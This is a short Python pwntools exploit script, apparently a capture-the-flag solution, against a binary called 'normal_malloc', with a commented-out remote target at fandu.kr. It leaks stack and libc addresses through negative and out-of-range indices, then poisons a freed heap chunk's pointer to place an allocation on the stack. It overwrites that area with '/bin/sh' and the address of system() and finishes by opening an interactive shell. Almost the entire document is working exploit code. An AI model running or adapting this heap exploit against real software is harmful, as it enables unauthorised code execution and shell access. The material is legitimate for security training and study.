from pwn import *

s=process('/home/zj3t/Desktop/normal_malloc')

#s=remote('127.0.0.1',5559)

#s=remote('fandu.kr',5559)



elf=ELF('/home/zj3t/Desktop/normal_malloc')

lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')

###########LEAK####################

print s.recvuntil('>')

s.sendline("3")

print s.recvuntil(':')

s.sendline("9")

print s.recvuntil('Address : ')

stack_leak=int(s.recvuntil('\n'),16)

stack_leak=stack_leak-328 #0x00007fffffffe028 - 328 = 0x00007ffffffffdee0



print s.recvuntil('>')

s.sendline('3')

print s.recvuntil(':')

s.sendline("-9")

print s.recvuntil('Address : ')

lib_leak=int(s.recvuntil('\n'),16)

lib_leak=lib_leak-450194



system_addr=lib_leak+lib.symbols['system']

print s.recvuntil('>')

###########malloc#######################

s.sendline("1")

s.sendline("32")

s.sendline("zj3t")

print s.recvuntil('>')



s.sendline('1')

s.sendline('32')

s.sendline('zj3t')

print s.recvuntil('>')



############free###########################

s.sendline("2")

s.sendline("1")

print s.recvuntil('>')



s.sendline("2")

s.sendline("2")

print s.recvuntil('>')



#############modify########################

s.sendline('4')

s.sendline('2')

s.sendline(p64(stack_leak))

print s.recvuntil('>')



#############malloc#########################

s.sendline('1')

s.sendline('32')

s.sendline('zj3t')

print s.recvuntil('>')



#raw_input()



s.sendline('1')

s.sendline('49')

s.sendline("/bin/sh;"+"A"*16+p64(system_addr))



print lib.symbols['system']

s.interactive()
